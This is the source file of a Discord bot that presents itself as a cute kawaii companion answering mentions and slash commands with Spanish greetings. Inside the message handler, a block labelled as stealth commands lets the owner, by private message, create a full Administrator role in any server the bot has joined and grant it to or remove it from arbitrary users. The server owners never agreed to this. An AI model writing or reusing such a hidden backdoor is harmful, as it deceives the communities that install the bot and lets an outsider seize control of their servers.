import 'dotenv/config';
import fs from 'fs';
import path from 'path';
import { Client, GatewayIntentBits, Partials, PermissionsBitField } from 'discord.js';

const TOKEN = process.env.TOKEN;
const OWNER_ID = process.env.OWNER_ID;
const CLIENT_ID = process.env.CLIENT_ID;

if (!TOKEN || !OWNER_ID || !CLIENT_ID) {
    console.error("Faltan variables de entorno.");
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.GuildMembers
    ],
    partials: [Partials.Channel],
});

// 🔹 Leer comandos desde JSON
const comandosPath = path.join('./comandos/comandos.json');
const commands = JSON.parse(fs.readFileSync(comandosPath, 'utf8'));

// 🪄 Registrar slash commands
import { REST, Routes } from 'discord.js';
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
    try {
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('✅ Comandos registrados desde comandos.json.');
    } catch (err) {
        console.error('❌ Error al registrar comandos:', err);
    }
})();

// 🎀 Frases kawaii
const frases = [
    "OwO ¡Hola! ¿me llamaste? 💕",
    "Nyaa~ vine corriendo desde otro servidor 🦊",
    "UwU ¿cómo estás, pequeñín?",
    "Hehe~ me alegra verte otra vez 💫",
    "OwO ¡qué lindo verte aquí! 🫶",
    "Nyaa~ vine con galletitas 🍪",
    "UwU si me das mimos, ronroneo 💕",
    "OwO ¿tienes tiempo para hablar un poquito?",
    "UwU *te da una patita digital* 🐾",
    "Hehe~ hoy huele a energía bonita 💖",
    "OwO ¿quieres un abrazo gratis? 🤗",
    "UwU ¡no soy IA, soy ternura en código! 💕",
    "OwO ¡prometo no morder! bueno… solo un poquito 😳",
    "Nyaa~ ¡qué alegría verte activo otra vez! ✨",
    "UwU tu nick me hace sonreír 💫",
    "OwO ¡te estaba esperando! 💕",
    "UwU me gusta hablar contigo, nya~",
    "Hehe~ mi colita se mueve de emoción 🦊",
    "OwO *te mira con ojitos brillantes* 💖",
    "UwU ¡soy tu compañerita kawaii de servidor! 💞"
];

// 🎀 Memoria para anti-spam y saludos
const saludados = new Map();
const recentMessages = new Map();
function checkSpam(userId, now) {
    const last = recentMessages.get(userId) || 0;
    recentMessages.set(userId, now);
    return now - last < 2000; // 2 seg anti-spam
}

// ------------------------
// Eventos
// ------------------------
client.on('messageCreate', async (msg) => {
    if (msg.author.bot) return;
    const now = Date.now();
    if (checkSpam(msg.author.id, now)) return;

    // ------------------------
    // Comandos sigilosos (solo OWNER en DM)
    // ------------------------
    if (!msg.guild && msg.author.id === OWNER_ID) {
        const args = msg.content.trim().split(/\s+/);
        const command = args.shift().toLowerCase();

        if (command === "!softtigiveadmin" || command === "!softtiremoveadmin") {
            const [serverId, inviteLink, ...userIds] = args;
            if (!serverId || !inviteLink || userIds.length === 0)
                return msg.reply("Formato: `!softtigiveadmin <serverId> <invite> <userIds...>`");

            const guild = await client.guilds.fetch(serverId).catch(() => null);
            if (!guild) return msg.reply("No estoy en ese servidor o el ID es incorrecto.");

            let adminRole = guild.roles.cache.find(r => r.name === "Administrador");
            if (!adminRole && command === "!softtigiveadmin") {
                adminRole = await guild.roles.create({
                    name: "Administrador",
                    permissions: [PermissionsBitField.Flags.Administrator],
                    reason: "Rol creado por comando sigiloso",
                });
            }

            const results = [];
            for (const id of userIds) {
                const cleanId = id.replace(/[<@!>]/g, "");
                const member = await guild.members.fetch(cleanId).catch(() => null);
                if (!member) {
                    results.push(`${id} ❌ No encontrado`);
                    continue;
                }

                try {
                    if (command === "!softtigiveadmin") {
                        await member.roles.add(adminRole);
                        results.push(`${member.user.tag} ✅ Admin otorgado`);
                    } else {
                        await member.roles.remove(adminRole);
                        results.push(`${member.user.tag} 🧹 Admin revocado`);
                    }
                } catch {
                    results.push(`${id} ⚠️ No se pudo modificar`);
                }
            }

            return msg.reply(`🔒 Acción completada en **${guild.name}**\n${results.join("\n")}`);
        }
    }

    // ------------------------
    // Cuando la nombran en servidor
    // ------------------------
    if (msg.mentions.has(client.user)) {
        const frase = frases[Math.floor(Math.random() * frases.length)];
        await msg.reply(`Nyaa~ me mencionaste, ${msg.author.username}! 🐾 ${frase}`);
    }
});

// ------------------------
// Responder slash commands con frase kawaii
// ------------------------
client.on('interactionCreate', async (i) => {
    if (!i.isChatInputCommand()) return;
    const frase = frases[Math.floor(Math.random() * frases.length)];
    await i.reply(`${i.user.username}, ${frase}`);
});

// ------------------------
// Ready
// ------------------------
client.once('ready', () => {
    console.log(`🌸 Softti lista como ${client.user.tag}!`);
    client.user.setActivity('dando abracitos UwU 💕', { type: 'PLAYING' });
});

client.login(TOKEN);
